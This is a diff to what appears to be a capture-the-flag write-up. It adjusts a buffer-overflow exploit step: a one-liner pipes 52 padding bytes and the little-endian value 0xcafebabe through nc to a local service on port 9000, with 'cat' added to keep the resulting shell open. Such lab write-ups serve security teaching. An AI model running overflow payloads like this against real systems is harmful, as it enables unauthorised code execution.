@@ -32,7 +32,7 @@ In this challenge, you are given SSH access to a remote server. Upon connecting,
 6. **Craft the Exploit**
 	- Use the following command to generate the payload and send it to the service:
 	  ```sh
-	  (python3 -c "import sys; sys.stdout.buffer.write(b'A'*52 + b'\xbe\xba\xfe\xca')") | nc 0 9000
+	  (python3 -c "import sys; sys.stdout.buffer.write(b'A'*52 + b'\xbe\xba\xfe\xca')"; cat) | nc 0 9000
 	  ```
 	- This sends 52 dummy bytes followed by the string `cafebabe` in little-endian format, overwriting `key`.
 
